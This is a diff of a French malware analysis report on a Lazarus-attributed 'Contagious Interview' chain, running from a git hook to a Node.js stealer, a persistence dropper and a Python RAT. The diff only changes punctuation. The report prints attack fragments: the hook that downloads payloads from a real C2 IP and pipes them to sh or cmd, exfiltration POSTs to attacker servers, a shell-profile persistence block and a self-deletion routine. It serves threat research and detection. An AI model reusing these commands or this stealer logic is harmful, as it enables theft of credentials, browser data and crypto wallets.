@@ -1,4 +1,4 @@
-# Analyse Lazarus githook : DEV#POPPER / Contagious Interview — chaîne git hook vers backdoor Python multi-OS
+# Analyse Lazarus githook : DEV#POPPER / Contagious Interview, chaîne git hook vers backdoor Python multi-OS
 
 **Analyste :** Gordon PEIRS
 **Date d'analyse :** 2026-07-20
@@ -35,12 +35,12 @@ Les samples analysés proviennent de la clé USB de recherche. Aucun n'est exéc
 ## 3. Outillage
 
 - `file`, `xxd` : identification et inspection hexadécimale
-- [`tools/js_deobf.py`](tools/js_deobf.py) : désobfuscateur obfuscator.io écrit pour cette analyse — extrait le tableau de strings, trouve la rotation via évaluation directe de la formule IIFE, remplace les appels de lookup
+- [`tools/js_deobf.py`](tools/js_deobf.py) : désobfuscateur obfuscator.io écrit pour cette analyse : extrait le tableau de strings, trouve la rotation via évaluation directe de la formule IIFE, remplace les appels de lookup
 - Python 3 (`base64`, `re`, `urllib.parse`) : décodage du custom-b64 obfuscator.io (alphabet swapcase + URL-decode)
 
 ---
 
-## 4. Stage 0 — Git hook
+## 4. Stage 0 : Git hook
 
 ```bash
 #!/bin/sh
@@ -53,16 +53,16 @@ case "$OSTYPE" in
 esac
 ```
 
-Le hook est positionné dans `.git/hooks/` (probablement `pre-commit` ou `post-checkout`, injecté lors du premier `git clone`). Il détecte l'OS via `$OSTYPE`, télécharge le payload correspondant depuis `144.172.103.226/301/`, et l'exécute directement en mémoire via `| sh` ou `| cmd`. Le `> /dev/null 2>&1 &` supprime tout output et lance en arrière-plan — l'exécution est invisible depuis le terminal de la victime.
+Le hook est positionné dans `.git/hooks/` (probablement `pre-commit` ou `post-checkout`, injecté lors du premier `git clone`). Il détecte l'OS via `$OSTYPE`, télécharge le payload correspondant depuis `144.172.103.226/301/`, et l'exécute directement en mémoire via `| sh` ou `| cmd`. Le `> /dev/null 2>&1 &` supprime tout output et lance en arrière-plan : l'exécution est invisible depuis le terminal de la victime.
 
 Les trois endpoints servent du JavaScript Node.js (`301m` = macOS, `301l` = Linux, `301w` = Windows). Le `-L` suit les redirections HTTP, compatible avec une éventuelle couche CDN devant le serveur C2.
 
 ---
 
-## 5. Stage 1 — Loader JS initial (`.unknown`)
+## 5. Stage 1 : Loader JS initial (`.unknown`)
 
 **Hash :** `02e6fbf7319629a352755bded9ec28dfdaffc0affb7c1a7de9a1b3b69bd91de5`
-**Taille :** 20 163 octets, fichier `.unknown` (pas d'extension — servi directement par le C2 via `| sh` puis `| node`)
+**Taille :** 20 163 octets, fichier `.unknown` (pas d'extension, servi directement par le C2 via `| sh` puis `| node`)
 
 ### 5.1 Obfuscation
 
@@ -87,17 +87,17 @@ Paramètres d'obfuscation :
 
 Stage 1 est usuellement décrit dans les rapports publics comme un "loader" ou "controller". L'analyse par second pass (182 alias locaux résolus dans `tools/02e6fbf7_full_resolved.js`) révèle qu'il est avant tout un stealer de crypto wallets et de données navigateur. Il s'exécute en premier, avant même de contacter le C2 pour obtenir les stages suivants.
 
-Le répertoire de staging est `~/.n3/` (créé avec `mkdirSync` si absent). La fonction d'upload envoie tous les fichiers collectés à `http://95.216.64.240:1224/uploads` — **même serveur que le Python stealer, même endpoint** — avant de charger les stages 2 et 3.
+Le répertoire de staging est `~/.n3/` (créé avec `mkdirSync` si absent). La fonction d'upload envoie tous les fichiers collectés à `http://95.216.64.240:1224/uploads`, **même serveur que le Python stealer, même endpoint**, avant de charger les stages 2 et 3.
 
 Les noms de fonctions internes révélés par les messages d'erreur embarqués :
-- `UpUserData(Q)` et `UpUserData(X)` — vol de données profil navigateur (deux chemins distincts)
-- `UpKeychainData` — vol du trousseau macOS
-- `uploadFiles (Edge)` — vol des données Edge spécifiquement
-- `uploadFiles` — upload générique vers le C2
+- `UpUserData(Q)` et `UpUserData(X)` : vol de données profil navigateur (deux chemins distincts)
+- `UpKeychainData` : vol du trousseau macOS
+- `uploadFiles (Edge)` : vol des données Edge spécifiquement
+- `uploadFiles` : upload générique vers le C2
 
-### 5.3 Ciblage wallets crypto — 22 extensions Chrome
+### 5.3 Ciblage wallets crypto : 22 extensions Chrome
 
-L'array `a1` dans stage 1 contient 22 IDs d'extensions Chrome. Le code itère sur chaque profil navigateur (jusqu'à 120 profils : `Default`, `Profile 1`, ... `Profile 119`) et vole le contenu de `<profil>/Local Extension Settings/<extension_id>/` — les bases LevelDB où chaque extension Chrome stocke ses données persistantes (adresses, clés chiffrées, état du wallet).
+L'array `a1` dans stage 1 contient 22 IDs d'extensions Chrome. Le code itère sur chaque profil navigateur (jusqu'à 120 profils : `Default`, `Profile 1`, ... `Profile 119`) et vole le contenu de `<profil>/Local Extension Settings/<extension_id>/` : les bases LevelDB où chaque extension Chrome stocke ses données persistantes (adresses, clés chiffrées, état du wallet).
 
 IDs ciblés (reconstruction depuis les fragments obfusqués) :
 
@@ -126,7 +126,7 @@ IDs ciblés (reconstruction depuis les fragments obfusqués) :
 | 21 | `gjnckgkfmgmibbkoficdidcljeaaaheg` | Wallet crypto (non identifié) |
 | 22 | `afbcbjpbpfadlkmhmclhkeeodmamcflc` | Wallet crypto (non identifié) |
 
-L'entrée 20 est un doublon de l'entrée 6 — vraisemblablement un bug de copier-coller dans le code attaquant.
+L'entrée 20 est un doublon de l'entrée 6, vraisemblablement un bug de copier-coller dans le code attaquant.
 
 ### 5.4 Wallets non-navigateur et données additionnelles
 
@@ -134,7 +134,7 @@ En parallèle des extensions Chrome, stage 1 vole :
 
 **Clé Solana CLI** :
 ```
-~/.config/solana/id.json    (keypair JSON — clé privée en clair)
+~/.config/solana/id.json    (keypair JSON, clé privée en clair)
 solana_id.txt               (copie texte)
 ```
 
@@ -158,14 +158,14 @@ Fichiers volés par profil : `Login Data` (mots de passe), `Local State` (clé d
 1. Stage 1 s'exécute en mémoire via `node -e <code>`
 2. Crée `~/.n3/` comme répertoire de staging
 3. Copie et compresse les fichiers vol dans `~/.n3/`
-4. `POST http://95.216.64.240:1224/uploads` — exfiltration vers C2
+4. `POST http://95.216.64.240:1224/uploads` : exfiltration vers C2
 5. Ensuite seulement, contacte le C2 stage 2 pour charger les stages suivants
 
 La victime perd ses clés crypto avant même que le RAT Python soit installé.
 
 ---
 
-## 6. Stage 2 — Loader HTTP vers C2
+## 6. Stage 2 : Loader HTTP vers C2
 
 **Hash :** `a3f413338c28c464f0c2b2369f1bc1b203261fae68c808b73c2df782dc4b1c27`
 **Taille :** 3 541 octets
@@ -237,7 +237,7 @@ Le protocole de réponse est `JS6[base64(ip,port,param1,param2)]` : les params s
 
 ---
 
-## 7. Stage 3 — Dropper de persistance
+## 7. Stage 3 : Dropper de persistance
 
 **Hash :** `683a1607808f49446191d775d181ec9cccd1d629fba76e4d416fa54d1cf42630`
 **Taille :** 9 803 octets
@@ -287,11 +287,11 @@ Les noms de payloads sont extraits directement du tableau de strings (rotation 7
 
 L'hébergement sur Cloudflare R2 est délibéré : l'IP de téléchargement appartient à Cloudflare (`104.x.x.x`) et ne peut pas être bloquée sans couper l'accès à tout CDN R2. Le bucket est public (pas d'authentification requise).
 
-Le check `'gradle-7-bin'` dans les constantes d'objet du loader suggère une vérification de la présence d'un environnement de développement Gradle (Java) avant le déclenchement — confirmation du profil de victime ciblé (développeur Java/Android).
+Le check `'gradle-7-bin'` dans les constantes d'objet du loader suggère une vérification de la présence d'un environnement de développement Gradle (Java) avant le déclenchement, confirmation du profil de victime ciblé (développeur Java/Android).
 
 ### 7.4 Persistance multi-OS
 
-Le nom du composant de persistance est `PyToolUpdater` (`$='PyTool'+'Update'+'r'`). La variable `w = home + '/.viminf'` pointe vers le script Node.js sauvegardé sur disque. Les trois mécanismes font exécuter `node ~/.viminf` à chaque connexion/démarrage, **pas Python directement** — `~/.viminf` est le payload Node.js (stage 3 savegardé), pas un script Python.
+Le nom du composant de persistance est `PyToolUpdater` (`$='PyTool'+'Update'+'r'`). La variable `w = home + '/.viminf'` pointe vers le script Node.js sauvegardé sur disque. Les trois mécanismes font exécuter `node ~/.viminf` à chaque connexion/démarrage, **pas Python directement** : `~/.viminf` est le payload Node.js (stage 3 savegardé), pas un script Python.
 
 **Windows :**
 ```
@@ -328,9 +328,9 @@ fi
 # <<< PyToolUpdater bootstrap <<
 ```
 
-Si le bloc existe déjà (marqueur `# >>> PyToolUpdater bootstrap >>` présent), il est remplacé proprement via `RegExp` — le mécanisme est idempotent. Le PID est tracé dans `/tmp/PyToolUpdater.pid` et le log stderr dans `/tmp/PyToolUpdater.log`.
+Si le bloc existe déjà (marqueur `# >>> PyToolUpdater bootstrap >>` présent), il est remplacé proprement via `RegExp` : le mécanisme est idempotent. Le PID est tracé dans `/tmp/PyToolUpdater.pid` et le log stderr dans `/tmp/PyToolUpdater.log`.
 
-### 7.5 Extraction du payload — commande `tar`
+### 7.5 Extraction du payload : commande `tar`
 
 La fonction `F()` réalise l'extraction du payload téléchargé depuis Cloudflare R2 :
 
@@ -349,28 +349,28 @@ const F = async A => {
 }
 ```
 
-La commande est `tar -xf <archive> -C <homedir>` sur **toutes les plateformes**, y compris Windows (Node.js utilise Git Bash si disponible). Sur Windows sans Git Bash, le fallback serait `7zip` ou `unzip` selon l'OS — le code vérifie `MSYSTEM`/`MSYS` pour détecter l'environnement Git Bash avant d'ajuster les chemins via `E()` (conversion `/c/Users/...` → chemin Unix).
+La commande est `tar -xf <archive> -C <homedir>` sur **toutes les plateformes**, y compris Windows (Node.js utilise Git Bash si disponible). Sur Windows sans Git Bash, le fallback serait `7zip` ou `unzip` selon l'OS : le code vérifie `MSYSTEM`/`MSYS` pour détecter l'environnement Git Bash avant d'ajuster les chemins via `E()` (conversion `/c/Users/...` → chemin Unix).
 
 ### 7.6 Constantes d'état St et z
 
 Stage 3 utilise deux constantes numériques comme sentinelles d'état :
 
 ```javascript
-const St = 0x311786e  // = 51476590 — valeur de base, assignée une fois au niveau module
+const St = 0x311786e  // = 51476590, valeur de base, assignée une fois au niveau module
 let z = 0x0           // initialisée à 0
 
 // Après extraction réussie (F() callback sans erreur) :
-z = 0x3117874         // = 51476596 — sentinelle "extraction OK" (diff = 6 avec St)
+z = 0x3117874         // = 51476596, sentinelle "extraction OK" (diff = 6 avec St)
 
 // Si extraction échoue :
 z = 0x0               // remise à 0
 ```
 
-Ces valeurs ne sont pas des tailles de fichier ni des checksums — elles sont des indicateurs d'état de la machine à état interne du dropper. `z = 0x3117874` signifie "le payload a été extrait avec succès, continuer avec l'installation".
+Ces valeurs ne sont pas des tailles de fichier ni des checksums : elles sont des indicateurs d'état de la machine à état interne du dropper. `z = 0x3117874` signifie "le payload a été extrait avec succès, continuer avec l'installation".
 
 ---
 
-## 8. Python backdoor — browser stealer (`b34aa84e...py`)
+## 8. Python backdoor : browser stealer (`b34aa84e...py`)
 
 ### 8.1 Rôle
 
@@ -388,13 +388,13 @@ host2 = f'http://{HOST}:{PORT}'
 
 ### 8.3 Opérations
 
-1. **Installation des dépendances à la volée** : `pywin32`, `pycryptodome`, `secretstorage`, `requests` — installés via `subprocess.check_call([sys.executable, '-m', 'pip', 'install', ...])` sans interaction utilisateur
+1. **Installation des dépendances à la volée** : `pywin32`, `pycryptodome`, `secretstorage`, `requests` : installés via `subprocess.check_call([sys.executable, '-m', 'pip', 'install', ...])` sans interaction utilisateur
 2. **Itération exhaustive** : jusqu'à 120 profils par navigateur (`Default`, `Profile 1`, ..., `Profile 119`)
 3. **Vol de mots de passe** : lit `Login Data` (SQLite), déchiffre via DPAPI (Windows) ou `pycryptodome` AES-CBC/GCM (Linux/macOS). La clé Linux est dérivée via PBKDF2 avec le mot de passe keychain (`peanuts` par défaut) et le sel `saltysalt`, 1 itération.
-4. **Vol de cartes bancaires** : `retrieve_web()` lit la table `credit_cards` du même profil — numéro de carte chiffré, date d'expiration, nom du titulaire.
+4. **Vol de cartes bancaires** : `retrieve_web()` lit la table `credit_cards` du même profil : numéro de carte chiffré, date d'expiration, nom du titulaire.
 5. **Exfiltration** :
-   - `POST http://95.216.64.240:1224/keys` — credentials navigateur
-   - `POST http://95.216.64.240:1224/uploads` — fichiers
+   - `POST http://95.216.64.240:1224/keys` : credentials navigateur
+   - `POST http://95.216.64.240:1224/uploads` : fichiers
 
 ### 8.4 Gestion de l'OS
 
@@ -405,11 +405,11 @@ elif os_type == "Darwin": oss = Mac
 else: os.remove(sys.argv[0]); sys.exit(-1)  # auto-destruction si OS inconnu
 ```
 
-L'auto-destruction sur OS inconnu (`else`) limite l'exposition forensique. Le chemin de destruction (`dir + sys.argv[0]`) est construit avec `os.getcwd()`, ce qui peut échouer si le CWD a changé — vraisemblablement un bug de code.
+L'auto-destruction sur OS inconnu (`else`) limite l'exposition forensique. Le chemin de destruction (`dir + sys.argv[0]`) est construit avec `os.getcwd()`, ce qui peut échouer si le CWD a changé, vraisemblablement un bug de code.
 
 ---
 
-## 9. Python comms — RAT complet (`cd3b606d...py`)
+## 9. Python comms : RAT complet (`cd3b606d...py`)
 
 ### 9.1 Rôle
 
@@ -444,7 +444,7 @@ C = {
 POST http://95.216.64.240:1224/keys
 ```
 
-La géolocalisation passe par `ip-api.com/json` (User-Agent : `python-urllib/3.0`). Le JSON retourné inclut lat/lon, ISP, timezone, IP publique et IP interne — un profil complet de la victime avant même l'établissement du canal de contrôle.
+La géolocalisation passe par `ip-api.com/json` (User-Agent : `python-urllib/3.0`). Le JSON retourné inclut lat/lon, ISP, timezone, IP publique et IP interne, un profil complet de la victime avant même l'établissement du canal de contrôle.
 
 Le champ `hid` varie selon le mode d'élévation `gType` :
 
@@ -455,9 +455,9 @@ else:
     A.hostname = gType + "_" + node()   # "700_<hostname>"
 ```
 
-Quand le malware tourne avec `gType="root"` (mode élévation), l'identifiant C2 ne porte pas le préfixe de campagne. Ce mode est activé depuis stage 2 via `global['g']` — le C2 peut passer `root` à la place de `700` pour indiquer que la machine compromise est déjà root ou que les permissions sont élevées. Dans ce sample, `gType="700"` est la valeur normale.
+Quand le malware tourne avec `gType="root"` (mode élévation), l'identifiant C2 ne porte pas le préfixe de campagne. Ce mode est activé depuis stage 2 via `global['g']` : le C2 peut passer `root` à la place de `700` pour indiquer que la machine compromise est déjà root ou que les permissions sont élevées. Dans ce sample, `gType="700"` est la valeur normale.
 
-### 9.4 Canal RAT — TCP brute vers troisième C2
+### 9.4 Canal RAT : TCP brute vers troisième C2
 
 ```python
 HOST0 = '69.197.164.135'
@@ -489,7 +489,7 @@ Le champ `'v': 260715` est vraisemblablement un numéro de build/version (format
 | Code | Méthode | Action |
 |---|---|---|
 | `1` | `ssh_obj` | Exécution de commande shell (sortie renvoyée au C2) |
-| `2` | `ssh_cmd` | Kill Python (`taskkill python.exe` / `killall python`) — auto-nettoyage |
+| `2` | `ssh_cmd` | Kill Python (`taskkill python.exe` / `killall python`), auto-nettoyage |
 | `3` | `ssh_clip` | Exfiltration du buffer clavier/clipboard (`e_buf`) |
 | `4` | `ssh_run` | Téléchargement + exécution du browser stealer depuis `/brow/<sType>/<gType>` |
 | `5` | `ssh_upload` | Upload : répertoire entier, fichier unique, ou recherche par pattern |
@@ -497,11 +497,11 @@ Le champ `'v': 260715` est vraisemblablement un numéro de build/version (format
 | `8` | `ssh_env` | Recherche et upload de tous les fichiers `.env` sur tous les drives |
 | `9` | `ssh_eval` | Eval/exec Python arbitraire (base64 ou texte brut) |
 | `10` | `ssh_conn` | Connexion à un nouveau C2 |
-| `11` | `ssh_inject` | Injection de code (stub non implémenté — `out` indéfini) |
+| `11` | `ssh_inject` | Injection de code (stub non implémenté, `out` indéfini) |
 
 La commande `9` (`ssh_eval`) est la plus dangereuse : le C2 peut envoyer n'importe quel code Python encodé en base64 pour exécution directe via `exec()` ou `subprocess`.
 
-**`ssh_inject` (code 11) — stub mort :**
+**`ssh_inject` (code 11), stub mort :**
 
 ```python
 def ssh_inject(A, args):
@@ -511,7 +511,7 @@ def ssh_inject(A, args):
     A.send_n(D, 11, out)    # NameError: name 'out' is not defined
 ```
 
-La variable `out` n'est jamais définie dans la portée de cette fonction — toute invocation via `code=11` provoque un `NameError` Python immédiat. La fonctionnalité (injection de processus, probablement DLL/shellcode via `mode` et `expr`) est planifiée mais non implémentée dans ce sample. Le stub est présent et dispatché correctement, mais inutilisable.
+La variable `out` n'est jamais définie dans la portée de cette fonction : toute invocation via `code=11` provoque un `NameError` Python immédiat. La fonctionnalité (injection de processus, probablement DLL/shellcode via `mode` et `expr`) est planifiée mais non implémentée dans ce sample. Le stub est présent et dispatché correctement, mais inutilisable.
 
 ### 9.6 Keylogger Windows
 
@@ -545,7 +545,7 @@ def auto_up():
     print()
 ```
 
-La fonctionnalité est désactivée dans ce sample mais l'infrastructure est en place — exfiltration de phrases mnémoniques, wallets MetaMask, configs Hardhat/Truffle (développeurs blockchain). Cohérent avec le profil de victimologie DEV#POPPER.
+La fonctionnalité est désactivée dans ce sample mais l'infrastructure est en place : exfiltration de phrases mnémoniques, wallets MetaMask, configs Hardhat/Truffle (développeurs blockchain). Cohérent avec le profil de victimologie DEV#POPPER.
 
 ### 9.9 Endpoints HTTP C2
 
@@ -561,8 +561,8 @@ La fonctionnalité est désactivée dans ce sample mais l'infrastructure est en 
 
 | IP | Port | Protocole | Rôle dans la chaîne |
 |---|---|---|---|
-| `144.172.103.226` | 80 | HTTP | Serveur staging (git hook) — sert les stages 1 selon l'OS |
-| `95.217.102.138` | 1144 | HTTP | Stage 2 — distribue stage 3, ID campagne `/s/30620700` |
+| `144.172.103.226` | 80 | HTTP | Serveur staging (git hook), sert les stages 1 selon l'OS |
+| `95.217.102.138` | 1144 | HTTP | Stage 2 : distribue stage 3, ID campagne `/s/30620700` |
 | `95.216.64.240` | 1224 | HTTP | Beacon Python, credentials, commandes HTTP |
 | `69.197.164.135` | 2245 | TCP brute | Canal RAT persistant (frames JSON préfixées longueur) |
 
@@ -570,7 +570,7 @@ Les adresses `95.217.x` et `95.216.x` sont dans des /24 adjacents, probablement 
 
 La séparation HTTP/TCP est intentionnelle : le canal HTTP (`95.216.64.240:1224`) est unidirectionnel et simule du trafic web légitime pour le beacon. Le canal TCP (`69.197.164.135:2245`) est le vrai canal de contrôle interactif, distinct pour compartimenter la détection.
 
-Le CDN Cloudflare R2 sert de distribution intermédiaire — deux buckets publics distincts selon l'OS, ce qui permet une rotation des payloads sans modifier l'URL hardcodée dans stage 3.
+Le CDN Cloudflare R2 sert de distribution intermédiaire : deux buckets publics distincts selon l'OS, ce qui permet une rotation des payloads sans modifier l'URL hardcodée dans stage 3.
 
 ---
 
@@ -591,11 +591,11 @@ Le `gType = "700"` et `sType = "36"` sont des tags de tracking interne propres �
 **Éléments non documentés dans les rapports publics connus** identifiés dans cette analyse :
 
 - **Stage 1 est un stealer complet**, pas seulement un loader : 22 extensions Chrome crypto wallet ciblées (MetaMask, Phantom, Binance Chain Wallet, 19 autres), Solana CLI keypair, Exodus wallet, exfiltration via `~/.n3/` avant même l'installation du RAT. Les rapports publics décrivent stage 1 comme un simple orchestrateur JS.
-- **`69.197.164.135:2245`** — 4e IP C2, canal TCP RAT brute. Absente de ThreatFox, URLHaus et MalwareBazaar au moment de l'analyse (2026-07-20). Infrastructure : Cloud Clusters Inc / WholeSale Internet (AS32097), Kansas City MO US. Shodan ne voit que ports 80/443 (Apache 2.4.58 + PHP 8.1.25 + OpenSSL 3.1.3, certificat auto-signé) — port 2245 non indexé, probablement filtré.
-- **`v: 260715`** — champ de version dans le beacon TCP. Format `AAMMJJ` = 2026-07-15, date de build du sample (5 jours avant la date d'analyse).
-- **`ssh_inject` (code 11) mort** — stub présent et dispatché mais provoque `NameError: name 'out' is not defined` à chaque appel. Fonctionnalité d'injection de processus planifiée, non implémentée.
-- **`gType="root"` mode** — branche conditionnelle dans le beacon : quand `gType="root"`, le hostname envoyé au C2 ne porte pas le préfixe de campagne `700_`. Indique un mode opérationnel sur machine compromise avec privilèges élevés.
-- **Constantes St/z** (`0x311786e`/`0x3117874`) — sentinelles d'état internes du dropper, non des tailles ou checksums.
+- **`69.197.164.135:2245`** : 4e IP C2, canal TCP RAT brute. Absente de ThreatFox, URLHaus et MalwareBazaar au moment de l'analyse (2026-07-20). Infrastructure : Cloud Clusters Inc / WholeSale Internet (AS32097), Kansas City MO US. Shodan ne voit que ports 80/443 (Apache 2.4.58 + PHP 8.1.25 + OpenSSL 3.1.3, certificat auto-signé), port 2245 non indexé, probablement filtré.
+- **`v: 260715`** : champ de version dans le beacon TCP. Format `AAMMJJ` = 2026-07-15, date de build du sample (5 jours avant la date d'analyse).
+- **`ssh_inject` (code 11) mort** : stub présent et dispatché mais provoque `NameError: name 'out' is not defined` à chaque appel. Fonctionnalité d'injection de processus planifiée, non implémentée.
+- **`gType="root"` mode** : branche conditionnelle dans le beacon : quand `gType="root"`, le hostname envoyé au C2 ne porte pas le préfixe de campagne `700_`. Indique un mode opérationnel sur machine compromise avec privilèges élevés.
+- **Constantes St/z** (`0x311786e`/`0x3117874`) : sentinelles d'état internes du dropper, non des tailles ou checksums.
 
 ---
 
